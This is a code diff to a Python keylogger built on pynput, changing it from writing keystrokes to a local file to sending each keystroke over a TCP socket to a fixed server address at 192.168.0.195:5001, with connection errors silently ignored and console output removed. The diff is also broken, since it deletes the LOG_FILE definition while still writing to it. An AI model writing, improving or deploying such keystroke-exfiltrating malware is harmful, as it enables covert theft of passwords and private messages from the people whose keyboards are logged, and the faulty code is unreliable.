@@ -1,28 +1,33 @@
-import os
+import socket
 from pynput import keyboard
 from datetime import datetime
 
-LOG_FILE = os.path.expanduser('~/keylog.txt')
+SERVER_IP = '192.168.0.195'
+SERVER_PORT = 5001
 
 # Ensure log file exists
-start_msg = f'\n--- Keylogger started at {datetime.now()} ---\n'
 with open(LOG_FILE, 'a') as f:
-    f.write(start_msg)
-print(start_msg, end='')
+    f.write(f'\n--- Keylogger started at {datetime.now()} ---\n')
+
+def send_keystroke(data):
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.settimeout(0.5)  # quick fail if server is offline
+            s.connect((SERVER_IP, SERVER_PORT))
+            s.sendall(data.encode())
+    except Exception:
+        pass  # Ignore if server is offline
 
 def on_press(key):
     try:
         k = key.char
     except AttributeError:
         k = f'<{key}>'
-    with open(LOG_FILE, 'a') as f:
-        f.write(k)
-    print(k, end='', flush=True)
+    send_keystroke(k)
 
 def on_release(key):
     if key == keyboard.Key.esc:
         # Stop listener with ESC
-        print("\n--- Keylogger stopped by user (ESC pressed) ---")
         return False
 
 if __name__ == '__main__':
